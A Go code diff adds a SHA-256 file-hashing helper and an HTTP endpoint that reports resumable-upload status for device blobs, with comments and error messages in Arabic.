+func sha256File(path string) (string, error) {
+	f, err := os.Open(path)
+	if err != nil {
+		return "", err
+	}
+	defer f.Close()
+	h := sha256.New()
+	if _, err := io.Copy(h, f); err != nil {
+		return "", err
+	}
+	return fmt.Sprintf("%x", h.Sum(nil)), nil
+}
+
+// GET /api/blob/status?device=&kind=&name=&sha= — حالة الرفع لاستئناف آمن.
+func handleBlobStatusAPI(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Access-Control-Allow-Origin", "*")
+	w.Header().Set("Access-Control-Allow-Methods", "GET, OPTIONS")
+	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Device-Id, X-Blob-Name, X-Blob-Sha")
+	if r.Method == http.MethodOptions {
+		w.WriteHeader(http.StatusNoContent)
+		return
+	}
+	if r.Method != http.MethodGet {
+		writeStateJSONError(w, http.StatusMethodNotAllowed, "طريقة غير مدعومة")
+		return
+	}
+	deviceID := strings.TrimSpace(r.URL.Query().Get("device"))
+	kind := strings.TrimSpace(r.URL.Query().Get("kind"))
+	name := strings.TrimSpace(r.URL.Query().Get("name"))
+	sha := strings.TrimSpace(r.URL.Query().Get("sha"))
+	if deviceID == "" || kind == "" || name == "" {
+		writeStateJSONError(w, http.StatusBadRequest, "device و kind و name مطلوبة")
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	if st, err := os.Stat(blobFilePath(deviceID, kind, name)); err == nil && !st.IsDir() {
+		blobMu.RLock()
+		it := blobData[deviceID][kind][name]
+		blobMu.RUnlock()
+		if sha != "" && it != nil && it.Sha256 != "" && it.Sha256 != sha {
+			json.NewEncoder(w).Encode(map[string]interface{}{
+				"ok": true, "complete": false, "offset": 0, "size": st.Size(), "conflict": true,
+			})
+			return
+		}
+		out := map[string]interface{}{"ok": true, "complete": true, "offset": st.Size(), "size": st.Size()}
+		if it != nil {
+			out["sha256"] = it.Sha256
+		}
+		json.NewEncoder(w).Encode(out)
+		return
+	}
+	off := int64(0)
+	if st, err := os.Stat(blobTempPath(deviceID, kind, name, sha)); err == nil {
+		off = st.Size()
+	}
+	json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "complete": false, "offset": off})
 }
 
 // B6: GET /api/blob/list?device=&kind= — قائمة أسماء الملفات المخزنة في ذاكرة خادم Render
